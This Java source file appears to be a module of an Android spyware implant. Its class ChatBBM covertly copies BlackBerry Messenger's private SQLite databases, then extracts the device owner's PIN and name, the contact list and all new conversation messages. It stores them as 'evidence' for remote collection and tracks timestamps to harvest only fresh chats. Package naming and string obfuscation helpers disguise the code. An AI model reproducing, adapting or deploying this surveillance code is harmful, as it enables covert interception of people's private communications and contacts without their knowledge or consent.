package com.android.dvci.module.chat;

import android.database.Cursor;

import com.android.dvci.auto.Cfg;
import com.android.dvci.db.GenericSqliteHelper;
import com.android.dvci.db.RecordGroupsVisitor;
import com.android.dvci.db.RecordVisitor;
import com.android.dvci.module.ModuleAddressBook;
import com.android.dvci.util.Check;
import com.android.mm.M;

import org.xml.sax.SAXException;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.ParserConfigurationException;

/**
 * Created by zeno on 30/10/14.
 */
public class ChatBBM extends SubModuleChat {


	private static final int BBM_v1 = 1;
	private static final int BBM_v2 = 0;
	private int version = BBM_v1;

	public class Account {

		public int id;
		public String displayName;
		public String pin;

		public String getName() {
			return (pin + " " + displayName).trim().toLowerCase();
		}
	}

	private static final String TAG = "ChatBBM";
	private static final int PROGRAM = 0x05; // anche per addressbook

	String pObserving = M.e("com.bbm");
	String dbFileMaster = M.e("/data/data/com.bbm/files/bbmcore/master.db");
	String dbFileGroup = M.e("/data/data/com.bbm/files/bbgroups/bbgroups.db");

	private long lastBBM;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	private Account account;

	//private GenericSqliteHelper helper;

	private boolean firstTime = true;

	private boolean started;

	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notifyStopProgram) ");
		}
		updateHistory();
	}

	private void updateHistory() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (updateHistory) ");
		}

		if (!started || !readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateHistory), semaphore red");
			}
			return;
		}
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFileMaster);

		try {
			if (helper == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateHistory) cannot open db");
				}
				return;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), read lastBBM: " + lastBBM);
			}

			if (Cfg.DEBUG) {
				Check.asserts(account != null, " (updateHistory) Assert failed, null account");
			}

			readBBMChatHistory(helper);


		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateHistory) Error: " + e);
			}
		} finally {
			if (helper != null) {
				helper.disposeDb();
			}
			readChatSemaphore.release();
		}
	}


	@Override
	protected void start() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (start) ");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), semaphore red");
			}
			return;
		}

		try {

			lastBBM = markup.unserialize(new Long(0));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), read lastBBM: " + lastBBM);
			}

			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFileMaster);
			if (helper == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start) cannot open db");
				}
				return;
			}

			try {
				version = getBBMVersion(helper);
				readLocalContact(helper);
				readAddressContacts(helper);

				readBBMChatHistory(helper);

			} finally {
				helper.disposeDb();
			}
			started = true;

		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
		} finally {
			readChatSemaphore.release();
		}

	}

	private int getBBMVersion(GenericSqliteHelper helper) {

		final int[] type = {0};
		RecordVisitor visitor = new RecordVisitor() {
			@Override
			public long cursor(Cursor cursor) {
				type[0] = cursor.getInt(0);
				return 0;
			}
		};

		helper.traverseRawQuery("SELECT count(name) FROM sqlite_master WHERE type='table' and name = 'UserPins'", null, visitor);
		return type[0];
	}

	private long readBBMChatHistory(GenericSqliteHelper helper) {
		long lastmessageS = readBBMConversationHistory(helper);
		long lastmessageG = readBBMGroupHistory();

		long lastmessage = Math.max(lastmessageS, lastmessageG);

		if (lastmessage > lastBBM) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start) serialize: %d", lastmessage);
			}
			markup.serialize(lastmessage);
			lastBBM = lastmessage;
		}

		return lastmessage;
	}

	private long readBBMGroupHistory() {
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFileGroup);
		if (helper == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start) cannot open db");
			}
			return 0;
		}

		try {
			// TODO

		} finally {
			helper.disposeDb();
		}

		return 0;
	}

	private long readBBMConversationHistory(GenericSqliteHelper helper) {

		String timestamp = Long.toString(this.lastBBM / 1000);
		final ChatGroups groups = new ChatGroups();
		RecordGroupsVisitor visitorGrp = new RecordGroupsVisitor(groups,"T.TIMESTAMP", true);
		String[] sql = new String[]{"SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,U.PIN FROM PARTICIPANTS AS P " +
				"JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID " +
				"JOIN USERS AS U ON U.USERID = P.USERID " +
				"WHERE C.MESSAGETIMESTAMP > ?",
				"SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,S.PIN FROM PARTICIPANTS AS P " +
						"JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID " +
						"JOIN USERS AS U ON U.USERID = P.USERID " +
						"JOIN USERPINS AS S ON U.USERID = S.USERID " +
						"WHERE C.MESSAGETIMESTAMP > ?"
				};

		helper.traverseRawQuery(sql[version], new String[]{timestamp}, visitorGrp);
		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

		if(groups.getAllGroups().size()==0){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readBBMConversationHistory), No groups ");
			}
			return 0;
		}

		Contact me = groups.getContact("0");
		if(me == null){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readBBMConversationHistory), ERROR: cannot get contact 0");
			}

			return 0;
		}
		final String me_number =me.number;
		final String me_name = me.name;

		RecordVisitor visitorMsg = new RecordVisitor(null, null, "T.TIMESTAMP") {
			@Override
			public long cursor(Cursor cursor) {
				String groupid = cursor.getString(0);
				Long timestamp = cursor.getLong(1) * 1000;
				Date date = new Date(timestamp);
				String content = cursor.getString(2);
				String userId = cursor.getString(3);

				boolean incoming = !userId.equals("0");
				Contact contact = groups.getContact(userId);

				String peer_id = contact.number;
				String peer = contact.name;

				String from_id, from, to_id, to;
				if(incoming){
					from_id = peer_id;
					from = peer;
					to_id = groups.getGroupToName(from_id, groupid);
					to = groups.getGroupToDisplayName(from_id, groupid);
				}else{
					from_id = me_number;
					from = me_name;
					to_id = groups.getGroupToName(from_id, groupid);
					to = groups.getGroupToDisplayName(from_id, groupid);
				}

				MessageChat message = new MessageChat(PROGRAM, date, from_id, from, to_id, to, content, incoming);
				messages.add(message);
				return timestamp;
			}
		};

		String sqlmsg ="SELECT C.CONVERSATIONID,T.TIMESTAMP,T.CONTENT, U.USERID\n" +
				"FROM TEXTMESSAGES AS T\n" +
				"JOIN CONVERSATIONS AS C ON T.CONVERSATIONID = C.CONVERSATIONID\n" +
				"JOIN PARTICIPANTS AS P ON P.PARTICIPANTID = T.PARTICIPANTID\n" +
				"JOIN USERS AS U ON U.USERID = P.USERID\n" +
				"WHERE T.TIMESTAMP>?\n" +
				"AND C.CONVERSATIONID=?\n";

		long maxid = 0;
		for( String group: groups.getAllGroups() ){
			long ret = helper.traverseRawQuery(sqlmsg, new String[]{timestamp, group}, visitorMsg);
			maxid=Math.max(ret, maxid);
		}

		getModule().saveEvidence(messages);

		return maxid;
	}

	private void readAddressContacts(GenericSqliteHelper helper) {

		if (ModuleAddressBook.getInstance() != null) {
			try {
				if (version == BBM_v1) {
					readAddressContactsUserPins(helper);
				} else {
					readAddressContactsUsers(helper);
				}
			} catch (SAXException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readAddressContacts), " + e);
				}
			} catch (IOException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readAddressContacts), " + e);
				}
			} catch (ParserConfigurationException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readAddressContacts), " + e);
				}
			}
		}
	}

	private void readAddressContactsUserPins(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {

		String sql = "SELECT u.userid,pin,displayname FROM Users as u JOIN UserPins as p on u.UserId=p.UserId";
		RecordVisitor visitor = new RecordVisitor() {
			@Override
			public long cursor(Cursor cursor) {
				int userid = cursor.getInt(0);
				String pin = cursor.getString(1);
				String name = cursor.getString(2).trim();

				Contact contact = new Contact(Integer.toString(userid), name, name, pin);
				ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.BBM, contact);

				return userid;
			}
		};

		helper.traverseRawQuery(sql, null, visitor);
	}

	private void readAddressContactsUsers(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {

		RecordVisitor visitor = new RecordVisitor(new String[]{"userid", "pin", "displayname"}, null) {
			@Override
			public long cursor(Cursor cursor) {
				int userid = cursor.getInt(0);
				String pin = cursor.getString(1);
				String name = cursor.getString(2).trim();

				Contact contact = new Contact(Integer.toString(userid), name, name, pin);
				ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.BBM, contact);

				return userid;
			}
		};

		helper.traverseRecords(M.e("Users"), visitor);
	}

	private void readLocalContact(GenericSqliteHelper helper) {

		String sql = "SELECT  p.UserId, p.Pin,  u.DisplayName FROM Profile as p JOIN Users as u on p.UserId = u.UserId";
		account = new Account();

		RecordVisitor visitor = new RecordVisitor(null, null) {

			@Override
			public long cursor(Cursor cursor) {
				account.id = cursor.getInt(0);
				account.pin = cursor.getString(1);
				account.displayName = cursor.getString(2);
				return 0;
			}
		};
		helper.traverseRawQuery(sql, null, visitor);

		ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.BBM, account.getName());
	}
}
